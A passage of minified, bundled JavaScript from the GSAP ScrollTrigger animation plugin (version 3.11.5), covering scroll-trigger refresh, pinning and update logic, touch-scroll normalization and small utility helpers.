                  (_t.pinState = kr = Xl(d))),
              !1 !== r.force3D && A.set(d, { force3D: !0 }),
              (x.spacer = yt = _t.spacer),
              ($i = In(d)),
              (Xo = $i[v + N.os2]),
              (Tr = A.getProperty(d)),
              (Me = A.quickSetter(d, N.a, tt)),
              mc(d, yt, $i),
              (bi = Xl(d))),
            O)
          ) {
            (nr = pu(O) ? Qh(O, Gh) : Gh),
              (vt = Yl("scroller-start", u, L, N, nr, 0)),
              (M = Yl("scroller-end", u, L, N, nr, 0, vt)),
              (Yo = vt["offset" + N.op.d2]);
            var Go = Lt(qr(L, "content") || L);
            (Yt = this.markerStart = Yl("start", u, Go, N, nr, Yo, 0, S)),
              (Vn = this.markerEnd = Yl("end", u, Go, N, nr, Yo, 0, S)),
              S && (Wi = A.quickSetter([Yt, Vn], N.a, tt)),
              !$ &&
                (!er.length || !0 !== qr(L, "fixedMarkers")) &&
                (aw(W ? Te : L),
                A.set([vt, M], { force3D: !0 }),
                (Hn = A.quickSetter(vt, N.a, tt)),
                (Er = A.quickSetter(M, N.a, tt)));
          }
          if (S) {
            var Q = S.vars.onUpdate,
              B = S.vars.onUpdateParams;
            S.eventCallback("onUpdate", function () {
              x.update(0, 0, 1), Q && Q.apply(S, B || []);
            });
          }
          (x.previous = function () {
            return q[q.indexOf(x) - 1];
          }),
            (x.next = function () {
              return q[q.indexOf(x) + 1];
            }),
            (x.revert = function (D, U) {
              if (!U) return x.kill(!0);
              var V = !1 !== D || !x.enabled,
                G = ft;
              V !== x.isReverted &&
                (V &&
                  ((Nn = Math.max(oe(), x.scroll.rec || 0)),
                  (fn = x.progress),
                  (ai = i && i.progress())),
                Yt &&
                  [Yt, Vn, vt, M].forEach(function (We) {
                    return (We.style.display = V ? "none" : "block");
                  }),
                V && ((ft = x), x.update(V)),
                d &&
                  (!C || !x.isActive) &&
                  (V ? hw(d, yt, kr) : mc(d, yt, In(d), wt)),
                V || x.update(V),
                (ft = G),
                (x.isReverted = V));
            }),
            (x.refresh = function (D, U) {
              if ((!ft && x.enabled) || U) {
                if (d && D && Sn) return void Ke(t, "scrollEnd", K1);
                !Jt && H && H(x),
                  (ft = x),
                  (ze = Et()),
                  Ne.tween && (Ne.tween.kill(), (Ne.tween = 0)),
                  Z && Z.pause(),
                  g && i && i.revert({ kill: !1 }).invalidate(),
                  x.isReverted || x.revert(!0, !0),
                  (x._subPinOffset = !1);
                for (
                  var Oe,
                    ut,
                    Yi,
                    ci,
                    Ie,
                    Qe,
                    bn,
                    Na,
                    gp,
                    Ko,
                    $n,
                    V = ie(),
                    G = lt(),
                    We = S ? S.duration() : Br(L, N),
                    ue = me <= 0.01,
                    ve = 0,
                    et = 0,
                    Ye = r.end,
                    je = r.endTrigger || f,
                    ye =
                      r.start ||
                      (0 !== r.start && f ? (d ? "0 0" : "0 100%") : 0),
                    Qt = (x.pinnedContainer =
                      r.pinnedContainer && Lt(r.pinnedContainer)),
                    St = (f && Math.max(0, q.indexOf(x))) || 0,
                    Xe = St;
                  Xe--;

                )
                  (Qe = q[Xe]).end || Qe.refresh(0, 1) || (ft = x),
                    (bn = Qe.pin) &&
                      (bn === f || bn === d || bn === Qt) &&
                      !Qe.isReverted &&
                      (Ko || (Ko = []), Ko.unshift(Qe), Qe.revert(!0, !0)),
                    Qe !== q[Xe] && (St--, Xe--);
                for (
                  Nt(ye) && (ye = ye(x)),
                    ee =
                      Zh(ye, f, V, N, oe(), Yt, vt, x, G, z, $, We, S) ||
                      (d ? -0.001 : 0),
                    Nt(Ye) && (Ye = Ye(x)),
                    Dn(Ye) &&
                      !Ye.indexOf("+=") &&
                      (~Ye.indexOf(" ")
                        ? (Ye = (Dn(ye) ? ye.split(" ")[0] : "") + Ye)
                        : ((ve = hu(Ye.substr(2), V)),
                          (Ye = Dn(ye)
                            ? ye
                            : (S
                                ? A.utils.mapRange(
                                    0,
                                    S.duration(),
                                    S.scrollTrigger.start,
                                    S.scrollTrigger.end,
                                    ee
                                  )
                                : ee) + ve),
                          (je = f))),
                    $e =
                      Math.max(
                        ee,
                        Zh(
                          Ye || (je ? "100% 0" : We),
                          je,
                          V,
                          N,
                          oe() + ve,
                          Vn,
                          M,
                          x,
                          G,
                          z,
                          $,
                          We,
                          S
                        )
                      ) || -0.001,
                    me = $e - ee || ((ee -= 0.01) && 0.001),
                    ve = 0,
                    Xe = St;
                  Xe--;

                )
                  (bn = (Qe = q[Xe]).pin) &&
                    Qe.start - Qe._pinPush <= ee &&
                    !S &&
                    Qe.end > 0 &&
                    ((Oe = Qe.end - Qe.start),
                    ((bn === f && Qe.start - Qe._pinPush < ee) || bn === Qt) &&
                      !ys(ye) &&
                      (ve += Oe * (1 - Qe.progress)),
                    bn === d && (et += Oe));
                if (
                  ((ee += ve),
                  ($e += ve),
                  ue &&
                    (fn = A.utils.clamp(0, 1, A.utils.normalize(ee, $e, Nn))),
                  (x._pinPush = et),
                  Yt &&
                    ve &&
                    (((Oe = {})[N.a] = "+=" + ve),
                    Qt && (Oe[N.p] = "-=" + oe()),
                    A.set([Yt, Vn], Oe)),
                  d)
                )
                  (Oe = In(d)),
                    (ci = N === He),
                    (Yi = oe()),
                    (Xt = parseFloat(Tr(N.a)) + et),
                    !We &&
                      $e > 1 &&
                      (($n = {
                        style: ($n = (W ? ge.scrollingElement || jn : L).style),
                        value: $n["overflow" + N.a.toUpperCase()],
                      }).style["overflow" + N.a.toUpperCase()] = "scroll"),
                    mc(d, yt, Oe),
                    (bi = Xl(d)),
                    (ut = ar(d, !0)),
                    (Na = $ && ni(L, ci ? Pt : He)()),
                    v &&
                      (((wt = [v + N.os2, me + et + tt]).t = yt),
                      (Xe = v === Re ? zf(d, N) + me + et : 0) &&
                        wt.push(N.d, Xe + tt),
                      Eo(wt),
                      Qt &&
                        q.forEach(function (qo) {
                          qo.pin === Qt &&
                            !1 !== qo.vars.pinSpacing &&
                            (qo._subPinOffset = !0);
                        }),
                      $ && oe(Nn)),
                    $ &&
                      (((Ie = {
                        top: ut.top + (ci ? Yi - ee : Na) + tt,
                        left: ut.left + (ci ? Na : Yi - ee) + tt,
                        boxSizing: "border-box",
                        position: "fixed",
                      })[Pi] = Ie["max" + Vo] =
                        Math.ceil(ut.width) + tt),
                      (Ie[Ni] = Ie["max" + sp] = Math.ceil(ut.height) + tt),
                      (Ie[gn] =
                        Ie[gn + Fs] =
                        Ie[gn + Is] =
                        Ie[gn + Us] =
                        Ie[gn + As] =
                          "0"),
                      (Ie[Re] = Oe[Re]),
                      (Ie[Re + Fs] = Oe[Re + Fs]),
                      (Ie[Re + Is] = Oe[Re + Is]),
                      (Ie[Re + Us] = Oe[Re + Us]),
                      (Ie[Re + As] = Oe[Re + As]),
                      (Cr = gw(kr, Ie, C)),
                      Jt && oe(0)),
                    i
                      ? ((gp = i._initted),
                        cc(1),
                        i.render(i.duration(), !0, !0),
                        (xt = Tr(N.a) - Xt + me + et),
                        (Qo = Math.abs(me - xt) > 1),
                        $ && Qo && Cr.splice(Cr.length - 2, 2),
                        i.render(0, !0, !0),
                        gp || i.invalidate(!0),
                        i.parent || i.totalTime(i.totalTime()),
                        cc(0))
                      : (xt = me),
                    $n &&
                      ($n.value
                        ? ($n.style["overflow" + N.a.toUpperCase()] = $n.value)
                        : $n.style.removeProperty("overflow-" + N.a));
                else if (f && oe() && !S)
                  for (ut = f.parentNode; ut && ut !== Te; )
                    ut._pinOffset &&
                      ((ee -= ut._pinOffset), ($e -= ut._pinOffset)),
                      (ut = ut.parentNode);
                Ko &&
                  Ko.forEach(function (qo) {
                    return qo.revert(!1, !0);
                  }),
                  (x.start = ee),
                  (x.end = $e),
                  (Wt = cn = Jt ? Nn : oe()),
                  !S && !Jt && (Wt < Nn && oe(Nn), (x.scroll.rec = 0)),
                  x.revert(!1, !0),
                  Pn &&
                    ((le = -1), x.isActive && oe(ee + me * fn), Pn.restart(!0)),
                  (ft = 0),
                  i &&
                    I &&
                    (i._initted || ai) &&
                    i.progress() !== ai &&
                    i.progress(ai, !0).render(i.time(), !0, !0),
                  (ue || fn !== x.progress || S) &&
                    (i &&
                      !I &&
                      i.totalProgress(
                        S && ee < -0.001 && !fn
                          ? A.utils.normalize(ee, $e, 0)
                          : fn,
                        !0
                      ),
                    (x.progress = (Wt - ee) / me === fn ? 0 : fn)),
                  d && v && (yt._pinOffset = Math.round(x.progress * xt)),
                  Z && Z.invalidate(),
                  c && !Jt && c(x);
              }
            }),
            (x.getVelocity = function () {
              return ((oe() - cn) / (Et() - du)) * 1e3 || 0;
            }),
            (x.endAnimation = function () {
              us(x.callbackAnimation),
                i &&
                  (Z
                    ? Z.progress(1)
                    : i.paused()
                    ? I || us(i, x.direction < 0, 1)
                    : us(i, i.reversed()));
            }),
            (x.labelToScroll = function (D) {
              return (
                (i &&
                  i.labels &&
                  (ee || x.refresh() || ee) +
                    (i.labels[D] / i.duration()) * me) ||
                0
              );
            }),
            (x.getTrailing = function (D) {
              var U = q.indexOf(x),
                V = x.direction > 0 ? q.slice(0, U).reverse() : q.slice(U + 1);
              return (
                Dn(D)
                  ? V.filter(function (G) {
                      return G.vars.preventOverlaps === D;
                    })
                  : V
              ).filter(function (G) {
                return x.direction > 0 ? G.end <= ee : G.start >= $e;
              });
            }),
            (x.update = function (D, U, V) {
              if (!S || V || D) {
                var et,
                  je,
                  ye,
                  Qt,
                  St,
                  Xe,
                  Oe,
                  G = !0 === Jt ? Nn : x.scroll(),
                  We = D ? 0 : (G - ee) / me,
                  ue = We < 0 ? 0 : We > 1 ? 1 : We || 0,
                  ve = x.progress;
                if (
                  (U &&
                    ((cn = Wt),
                    (Wt = S ? oe() : G),
                    y && ((ui = li), (li = i && !I ? i.totalProgress() : ue))),
                  T &&
                    !ue &&
                    d &&
                    !ft &&
                    !Vl &&
                    Sn &&
                    ee < G + ((G - cn) / (Et() - du)) * T &&
                    (ue = 1e-4),
                  ue !== ve && x.enabled)
                ) {
                  if (
                    ((Qt =
                      (St =
                        (et = x.isActive = !!ue && ue < 1) !==
                        (!!ve && ve < 1)) || !!ue != !!ve),
                    (x.direction = ue > ve ? 1 : -1),
                    (x.progress = ue),
                    Qt &&
                      !ft &&
                      ((je = ue && !ve ? 0 : 1 === ue ? 1 : 1 === ve ? 2 : 3),
                      I &&
                        ((ye =
                          (!St && "none" !== F[je + 1] && F[je + 1]) || F[je]),
                        (Oe =
                          i &&
                          ("complete" === ye || "reset" === ye || ye in i)))),
                    P &&
                      (St || Oe) &&
                      (Oe || p || !i) &&
                      (Nt(P)
                        ? P(x)
                        : x.getTrailing(P).forEach(function (Ie) {
                            return Ie.endAnimation();
                          })),
                    I ||
                      (!Z || ft || Vl
                        ? i && i.totalProgress(ue, !!ft)
                        : (Z._dp._time - Z._start !== Z._time &&
                            Z.render(Z._dp._time - Z._start),
                          Z.resetTo
                            ? Z.resetTo("totalProgress", ue, i._tTime / i._tDur)
                            : ((Z.vars.totalProgress = ue),
                              Z.invalidate().restart()))),
                    d)
                  )
                    if ((D && v && (yt.style[v + N.os2] = Xo), $)) {
                      if (Qt) {
                        if (
                          ((Xe =
                            !D && ue > ve && $e + 1 > G && G + 1 >= Br(L, N)),
                          C)
                        )
                          if (D || (!et && !Xe)) Jh(d, yt);
                          else {
                            var ut = ar(d, !0),
                              Yi = G - ee;
                            Jh(
                              d,
                              Te,
                              ut.top + (N === He ? Yi : 0) + tt,
                              ut.left + (N === He ? 0 : Yi) + tt
                            );
                          }
                        Eo(et || Xe ? Cr : bi),
                          (Qo && ue < 1 && et) ||
                            Me(Xt + (1 !== ue || Xe ? 0 : xt));
                      }
                    } else Me(vs(Xt + xt * ue));
                  y && !Ne.tween && !ft && !Vl && Pn.restart(!0),
                    l &&
                      (St || (_ && ue && (ue < 1 || !fc))) &&
                      ta(l.targets).forEach(function (Ie) {
                        return Ie.classList[et || _ ? "add" : "remove"](
                          l.className
                        );
                      }),
                    s && !I && !D && s(x),
                    Qt && !ft
                      ? (I &&
                          (Oe &&
                            ("complete" === ye
                              ? i.pause().totalProgress(1)
                              : "reset" === ye
                              ? i.restart(!0).pause()
                              : "restart" === ye
                              ? i.restart(!0)
                              : i[ye]()),
                          s && s(x)),
                        (St || !fc) &&
                          (a && St && pc(x, a),
                          Y[je] && pc(x, Y[je]),
                          _ && (1 === ue ? x.kill(!1, 1) : (Y[je] = 0)),
                          St || (Y[(je = 1 === ue ? 1 : 3)] && pc(x, Y[je]))),
                        E &&
                          !et &&
                          Math.abs(x.getVelocity()) > (ys(E) ? E : 2500) &&
                          (us(x.callbackAnimation),
                          Z
                            ? Z.progress(1)
                            : us(i, "reverse" === ye ? 1 : !ue, 1)))
                      : I && s && !ft && s(x);
                }
                if (Er) {
                  var ci = S ? (G / S.duration()) * (S._caScrollDist || 0) : G;
                  Hn(ci + (vt._isFlipped ? 1 : 0)), Er(ci);
                }
                Wi && Wi((-G / S.duration()) * (S._caScrollDist || 0));
              }
            }),
            (x.enable = function (D, U) {
              x.enabled ||
                ((x.enabled = !0),
                Ke(L, "resize", xs),
                Ke(W ? ge : L, "scroll", Ki),
                H && Ke(t, "refreshInit", H),
                !1 !== D && ((x.progress = fn = 0), (Wt = cn = le = oe())),
                !1 !== U && x.refresh());
            }),
            (x.getTween = function (D) {
              return D && Ne ? Ne.tween : Z;
            }),
            (x.setPositions = function (D, U) {
              d &&
                ((Xt += D - ee),
                (xt += U - D - me),
                v === Re && x.adjustPinSpacing(U - D - me)),
                (x.start = ee = D),
                (x.end = $e = U),
                (me = U - D),
                x.update();
            }),
            (x.adjustPinSpacing = function (D) {
              if (wt && D) {
                var U = wt.indexOf(N.d) + 1;
                (wt[U] = parseFloat(wt[U]) + D + tt),
                  (wt[1] = parseFloat(wt[1]) + D + tt),
                  Eo(wt);
              }
            }),
            (x.disable = function (D, U) {
              if (
                x.enabled &&
                (!1 !== D && x.revert(!0, !0),
                (x.enabled = x.isActive = !1),
                U || (Z && Z.pause()),
                (Nn = 0),
                _t && (_t.uncache = 1),
                H && Ge(t, "refreshInit", H),
                Pn &&
                  (Pn.pause(), Ne.tween && Ne.tween.kill() && (Ne.tween = 0)),
                !W)
              ) {
                for (var V = q.length; V--; )
                  if (q[V].scroller === L && q[V] !== x) return;
                Ge(L, "resize", xs), Ge(L, "scroll", Ki);
              }
            }),
            (x.kill = function (D, U) {
              x.disable(D, U), Z && !U && Z.kill(), u && delete jf[u];
              var V = q.indexOf(x);
              V >= 0 && q.splice(V, 1),
                V === Tt && gu > 0 && Tt--,
                (V = 0),
                q.forEach(function (G) {
                  return G.scroller === x.scroller && (V = 1);
                }),
                V || Jt || (x.scroll.rec = 0),
                i &&
                  ((i.scrollTrigger = null),
                  D && i.revert({ kill: !1 }),
                  U || i.kill()),
                Yt &&
                  [Yt, Vn, vt, M].forEach(function (G) {
                    return G.parentNode && G.parentNode.removeChild(G);
                  }),
                Bs === x && (Bs = 0),
                d &&
                  (_t && (_t.uncache = 1),
                  (V = 0),
                  q.forEach(function (G) {
                    return G.pin === d && V++;
                  }),
                  V || (_t.spacer = 0)),
                r.onKill && r.onKill(x);
            }),
            x.enable(!1, !1),
            ir && ir(x),
            i && i.add && !me
              ? A.delayedCall(0.01, function () {
                  return ee || $e || x.refresh();
                }) &&
                (me = 0.01) &&
                (ee = $e = 0)
              : x.refresh(),
            d && pw();
        } else this.update = this.refresh = this.kill = Xn;
      }),
      (t.register = function (r) {
        return (
          qi ||
            ((A = r || W1()), $1() && window.document && t.enable(), (qi = _s)),
          qi
        );
      }),
      (t.defaults = function (r) {
        if (r) for (var i in r) Wl[i] = r[i];
        return Wl;
      }),
      (t.disable = function (r, i) {
        (_s = 0),
          q.forEach(function (s) {
            return s[i ? "kill" : "disable"](r);
          }),
          Ge(te, "wheel", Ki),
          Ge(ge, "scroll", Ki),
          clearInterval(Bl),
          Ge(ge, "touchcancel", Xn),
          Ge(Te, "touchstart", Xn),
          bl(Ge, ge, "pointerdown,touchstart,mousedown", Yh),
          bl(Ge, ge, "pointerup,touchend,mouseup", Xh),
          ea.kill(),
          Hl(Ge);
        for (var o = 0; o < J.length; o += 3)
          $l(Ge, J[o], J[o + 1]), $l(Ge, J[o], J[o + 2]);
      }),
      (t.enable = function () {
        if (
          ((te = window),
          (ge = document),
          (jn = ge.documentElement),
          (Te = ge.body),
          A &&
            ((ta = A.utils.toArray),
            (mo = A.utils.clamp),
            (Lf = A.core.context || Xn),
            (cc = A.core.suppressOverwrites || Xn),
            (rp = te.history.scrollRestoration || "auto"),
            (If = te.pageYOffset),
            A.core.globals("ScrollTrigger", t),
            Te))
        ) {
          (_s = 1),
            sw(),
            Ue.register(A),
            (t.isTouch = Ue.isTouch),
            (Nr =
              Ue.isTouch &&
              /(iPad|iPhone|iPod|Mac)/g.test(navigator.userAgent)),
            Ke(te, "wheel", Ki),
            (F1 = [te, ge, jn, Te]),
            A.matchMedia
              ? ((t.matchMedia = function (u) {
                  var c,
                    a = A.matchMedia();
                  for (c in u) a.add(c, u[c]);
                  return a;
                }),
                A.addEventListener("matchMediaInit", function () {
                  return up();
                }),
                A.addEventListener("matchMediaRevert", function () {
                  return q1();
                }),
                A.addEventListener("matchMedia", function () {
                  wi(0, 1), Fi("matchMedia");
                }),
                A.matchMedia("(orientation: portrait)", function () {
                  return hc(), hc;
                }))
              : console.warn("Requires GSAP 3.11.0 or later"),
            hc(),
            Ke(ge, "scroll", Ki);
          var s,
            l,
            r = Te.style,
            i = r.borderTopStyle,
            o = A.core.Animation.prototype;
          for (
            o.revert ||
              Object.defineProperty(o, "revert", {
                value: function () {
                  return this.time(-0.01, !0);
                },
              }),
              r.borderTopStyle = "solid",
              s = ar(Te),
              He.m = Math.round(s.top + He.sc()) || 0,
              Pt.m = Math.round(s.left + Pt.sc()) || 0,
              i ? (r.borderTopStyle = i) : r.removeProperty("border-top-style"),
              Bl = setInterval(Kh, 250),
              A.delayedCall(0.5, function () {
                return (Vl = 0);
              }),
              Ke(ge, "touchcancel", Xn),
              Ke(Te, "touchstart", Xn),
              bl(Ke, ge, "pointerdown,touchstart,mousedown", Yh),
              bl(Ke, ge, "pointerup,touchend,mouseup", Xh),
              Df = A.utils.checkPrefix("transform"),
              _u.push(Df),
              qi = Et(),
              ea = A.delayedCall(0.2, wi).pause(),
              Zi = [
                ge,
                "visibilitychange",
                function () {
                  var u = te.innerWidth,
                    a = te.innerHeight;
                  ge.hidden
                    ? (($h = u), (Wh = a))
                    : ($h !== u || Wh !== a) && xs();
                },
                ge,
                "DOMContentLoaded",
                wi,
                te,
                "load",
                wi,
                te,
                "resize",
                xs,
              ],
              Hl(Ke),
              q.forEach(function (u) {
                return u.enable(0, 1);
              }),
              l = 0;
            l < J.length;
            l += 3
          )
            $l(Ge, J[l], J[l + 1]), $l(Ge, J[l], J[l + 2]);
        }
      }),
      (t.config = function (r) {
        "limitCallbacks" in r && (fc = !!r.limitCallbacks);
        var i = r.syncInterval;
        (i && clearInterval(Bl)) || ((Bl = i) && setInterval(Kh, i)),
          "ignoreMobileResize" in r &&
            (V1 = 1 === t.isTouch && r.ignoreMobileResize),
          "autoRefreshEvents" in r &&
            (Hl(Ge) || Hl(Ke, r.autoRefreshEvents || "none"),
            (B1 = -1 === (r.autoRefreshEvents + "").indexOf("resize")));
      }),
      (t.scrollerProxy = function (r, i) {
        var o = Lt(r),
          s = J.indexOf(o),
          l = Ii(o);
        ~s && J.splice(s, l ? 6 : 2),
          i && (l ? er.unshift(te, i, Te, i, jn, i) : er.unshift(o, i));
      }),
      (t.clearMatchMedia = function (r) {
        q.forEach(function (i) {
          return i._ctx && i._ctx.query === r && i._ctx.kill(!0, !0);
        });
      }),
      (t.isInViewport = function (r, i, o) {
        var s = (Dn(r) ? Lt(r) : r).getBoundingClientRect(),
          l = s[o ? Pi : Ni] * i || 0;
        return o
          ? s.right - l > 0 && s.left + l < te.innerWidth
          : s.bottom - l > 0 && s.top + l < te.innerHeight;
      }),
      (t.positionInViewport = function (r, i, o) {
        Dn(r) && (r = Lt(r));
        var s = r.getBoundingClientRect(),
          l = s[o ? Pi : Ni],
          u =
            null == i
              ? l / 2
              : i in na
              ? na[i] * l
              : ~i.indexOf("%")
              ? (parseFloat(i) * l) / 100
              : parseFloat(i) || 0;
        return o ? (s.left + u) / te.innerWidth : (s.top + u) / te.innerHeight;
      }),
      (t.killAll = function (r) {
        if (
          (q.slice(0).forEach(function (o) {
            return "ScrollSmoother" !== o.vars.id && o.kill();
          }),
          !0 !== r)
        ) {
          var i = Ai.killAll || [];
          (Ai = {}),
            i.forEach(function (o) {
              return o();
            });
        }
      }),
      t
    );
  })();
(b.version = "3.11.5"),
  (b.saveStyles = function (t) {
    return t
      ? ta(t).forEach(function (e) {
          if (e && e.style) {
            var n = Kt.indexOf(e);
            n >= 0 && Kt.splice(n, 5),
              Kt.push(
                e,
                e.style.cssText,
                e.getBBox && e.getAttribute("transform"),
                A.core.getCache(e),
                Lf()
              );
          }
        })
      : Kt;
  }),
  (b.revert = function (t, e) {
    return up(!t, e);
  }),
  (b.create = function (t, e) {
    return new b(t, e);
  }),
  (b.refresh = function (t) {
    return t ? xs() : (qi || b.register()) && wi(!0);
  }),
  (b.update = function (t) {
    return ++J.cache && hr(!0 === t ? 2 : 0);
  }),
  (b.clearScrollMemory = Z1),
  (b.maxScroll = function (t, e) {
    return Br(t, e ? Pt : He);
  }),
  (b.getScrollFunc = function (t, e) {
    return ni(Lt(t), e ? Pt : He);
  }),
  (b.getById = function (t) {
    return jf[t];
  }),
  (b.getAll = function () {
    return q.filter(function (t) {
      return "ScrollSmoother" !== t.vars.id;
    });
  }),
  (b.isScrolling = function () {
    return !!Sn;
  }),
  (b.snapDirectional = lp),
  (b.addEventListener = function (t, e) {
    var n = Ai[t] || (Ai[t] = []);
    ~n.indexOf(e) || n.push(e);
  }),
  (b.removeEventListener = function (t, e) {
    var n = Ai[t],
      r = n && n.indexOf(e);
    r >= 0 && n.splice(r, 1);
  }),
  (b.batch = function (t, e) {
    var l,
      n = [],
      r = {},
      i = e.interval || 0.016,
      o = e.batchMax || 1e9,
      s = function (a, c) {
        var p = [],
          f = [],
          d = A.delayedCall(i, function () {
            c(p, f), (p = []), (f = []);
          }).pause();
        return function (v) {
          p.length || d.restart(!0),
            p.push(v.trigger),
            f.push(v),
            o <= p.length && d.progress(1);
        };
      };
    for (l in e)
      r[l] =
        "on" === l.substr(0, 2) && Nt(e[l]) && "onRefreshInit" !== l
          ? s(0, e[l])
          : e[l];
    return (
      Nt(o) &&
        ((o = o()),
        Ke(b, "refresh", function () {
          return (o = e.batchMax());
        })),
      ta(t).forEach(function (u) {
        var a = {};
        for (l in r) a[l] = r[l];
        (a.trigger = u), n.push(b.create(a));
      }),
      n
    );
  });
var n0,
  t0 = function (e, n, r, i) {
    return (
      n > i ? e(i) : n < 0 && e(0),
      r > i ? (i - n) / (r - n) : r < 0 ? n / (n - r) : 1
    );
  },
  gc = function t(e, n) {
    !0 === n
      ? e.style.removeProperty("touch-action")
      : (e.style.touchAction =
          !0 === n
            ? "auto"
            : n
            ? "pan-" + n + (Ue.isTouch ? " pinch-zoom" : "")
            : "none"),
      e === jn && t(Te, n);
  },
  Ql = { auto: 1, scroll: 1 },
  vw = function (e) {
    var u,
      n = e.event,
      r = e.target,
      i = e.axis,
      o = (n.changedTouches ? n.changedTouches[0] : n).target,
      s = o._gsap || A.core.getCache(o),
      l = Et();
    if (!s._isScrollT || l - s._isScrollT > 2e3) {
      for (
        ;
        o &&
        o !== Te &&
        ((o.scrollHeight <= o.clientHeight && o.scrollWidth <= o.clientWidth) ||
          (!Ql[(u = In(o)).overflowY] && !Ql[u.overflowX]));

      )
        o = o.parentNode;
      (s._isScroll =
        o &&
        o !== r &&
        !Ii(o) &&
        (Ql[(u = In(o)).overflowY] || Ql[u.overflowX])),
        (s._isScrollT = l);
    }
    (s._isScroll || "x" === i) && (n.stopPropagation(), (n._gsapAllow = !0));
  },
  e_ = function (e, n, r, i) {
    return Ue.create({
      target: e,
      capture: !0,
      debounce: !1,
      lockAxis: !0,
      type: n,
      onWheel: (i = i && vw),
      onPress: i,
      onDrag: i,
      onScroll: i,
      onEnable: function () {
        return r && Ke(ge, Ue.eventTypes[0], r0, !1, !0);
      },
      onDisable: function () {
        return Ge(ge, Ue.eventTypes[0], r0, !0);
      },
    });
  },
  yw = /(input|label|select|textarea)/i,
  r0 = function (e) {
    var n = yw.test(e.target.tagName);
    (n || n0) && ((e._gsapAllow = !0), (n0 = n));
  },
  xw = function (e) {
    pu(e) || (e = {}),
      (e.preventDefault = e.isNormalizer = e.allowClicks = !0),
      e.type || (e.type = "wheel,touch"),
      (e.debounce = !!e.debounce),
      (e.id = e.id || "normalizer");
    var l,
      u,
      _,
      y,
      L,
      X,
      W,
      $,
      n = e,
      r = n.normalizeScrollX,
      i = n.momentum,
      o = n.allowNestedScroll,
      s = n.onRelease,
      a = Lt(e.target) || jn,
      c = A.core.globals().ScrollSmoother,
      p = c && c.get(),
      f =
        Nr &&
        ((e.content && Lt(e.content)) ||
          (p && !1 !== e.content && !p.smooth() && p.content())),
      d = ni(a, He),
      v = ni(a, Pt),
      g = 1,
      T =
        (Ue.isTouch && te.visualViewport
          ? te.visualViewport.scale * te.visualViewport.width
          : te.outerWidth) / te.innerWidth,
      m = 0,
      h = Nt(i)
        ? function () {
            return i(l);
          }
        : function () {
            return i || 2.8;
          },
      C = e_(a, e.type, !0, o),
      k = function () {
        return (y = !1);
      },
      S = Xn,
      E = Xn,
      P = function () {
        (u = Br(a, He)),
          (E = mo(Nr ? 1 : 0, u)),
          r && (S = mo(0, Br(a, Pt))),
          (_ = Mi);
      },
      N = function () {
        (f._gsap.y = vs(parseFloat(f._gsap.y) + d.offset) + "px"),
          (f.style.transform =
            "matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, " +
            parseFloat(f._gsap.y) +
            ", 0, 1)"),
          (d.offset = d.cacheID = 0);
      },
      Y = function () {
        P(),
          L.isActive() &&
            L.vars.scrollY > u &&
            (d() > u ? L.progress(1) && d(u) : L.resetTo("scrollY", u));
      };
    return (
      f && A.set(f, { y: "+=0" }),
      (e.ignoreCheck = function (F) {
        return (
          (Nr &&
            "touchmove" === F.type &&
            (function () {
              if (y) {
                requestAnimationFrame(k);
                var O = vs(l.deltaY / 2),
                  z = E(d.v - O);
                if (f && z !== d.v + d.offset) {
                  d.offset = z - d.v;
                  var x = vs((parseFloat(f && f._gsap.y) || 0) - d.offset);
                  (f.style.transform =
                    "matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, " +
                    x +
                    ", 0, 1)"),
                    (f._gsap.y = x + "px"),
                    (d.cacheID = J.cache),
                    hr();
                }
                return !0;
              }
              d.offset && N(), (y = !0);
            })()) ||
          (g > 1.05 && "touchstart" !== F.type) ||
          l.isGesturing ||
          (F.touches && F.touches.length > 1)
        );
      }),
      (e.onPress = function () {
        y = !1;
        var F = g;
        (g = vs(((te.visualViewport && te.visualViewport.scale) || 1) / T)),
          L.pause(),
          F !== g && gc(a, g > 1.01 || (!r && "x")),
          (X = v()),
          (W = d()),
          P(),
          (_ = Mi);
      }),
      (e.onRelease = e.onGestureStart =
        function (F, O) {
          if ((d.offset && N(), O)) {
            J.cache++;
            var x,
              H,
              z = h();
            r &&
              ((H = (x = v()) + (0.05 * z * -F.velocityX) / 0.227),
              (z *= t0(v, x, H, Br(a, Pt))),
              (L.vars.scrollX = S(H))),
              (H = (x = d()) + (0.05 * z * -F.velocityY) / 0.227),
              (z *= t0(d, x, H, Br(a, He))),
              (L.vars.scrollY = E(H)),
              L.invalidate().duration(z).play(0.01),
              ((Nr && L.vars.scrollY >= u) || x >= u - 1) &&
                A.to({}, { onUpdate: Y, duration: z });
          } else $.restart(!0);
          s && s(F);
        }),
      (e.onWheel = function () {
        L._ts && L.pause(), Et() - m > 1e3 && ((_ = 0), (m = Et()));
      }),
      (e.onChange = function (F, O, z, x, H) {
        if (
          (Mi !== _ && P(),
          O && r && v(S(x[2] === O ? X + (F.startX - F.x) : v() + O - x[1])),
          z)
        ) {
          d.offset && N();
          var ie = H[2] === z,
            lt = ie ? W + F.startY - F.y : d() + z - H[1],
            le = E(lt);
          ie && lt !== le && (W += le - lt), d(le);
        }
        (z || O) && hr();
      }),
      (e.onEnable = function () {
        gc(a, !r && "x"),
          b.addEventListener("refresh", Y),
          Ke(te, "resize", Y),
          d.smooth &&
            ((d.target.style.scrollBehavior = "auto"),
            (d.smooth = v.smooth = !1)),
          C.enable();
      }),
      (e.onDisable = function () {
        gc(a, !0),
          Ge(te, "resize", Y),
          b.removeEventListener("refresh", Y),
          C.kill();
      }),
      (e.lockAxis = !1 !== e.lockAxis),
      ((l = new Ue(e)).iOS = Nr),
      Nr && !d() && d(1),
      Nr && A.ticker.add(Xn),
      ($ = l._dc),
      (L = A.to(l, {
        ease: "power4",
        paused: !0,
        scrollX: r ? "+=0.1" : "+=0",
        scrollY: "+=0.1",
        modifiers: {
          scrollY: J1(d, d(), function () {
            return L.pause();
          }),
        },
        onUpdate: hr,
        onComplete: $.vars.onComplete,
      })),
      l
    );
  };
function Ff() {
  return (
    (Ff = Object.assign
      ? Object.assign.bind()
      : function (t) {
          for (var e = 1; e < arguments.length; e++) {
            var n = arguments[e];
            for (var r in n)
              Object.prototype.hasOwnProperty.call(n, r) && (t[r] = n[r]);
          }
          return t;
        }),
    Ff.apply(this, arguments)
  );
}
function ra(t, e, n) {
  return Math.max(t, Math.min(e, n));
}
(b.sort = function (t) {
  return q.sort(
    t ||
      function (e, n) {
        return (
          -1e6 * (e.vars.refreshPriority || 0) +
          e.start -
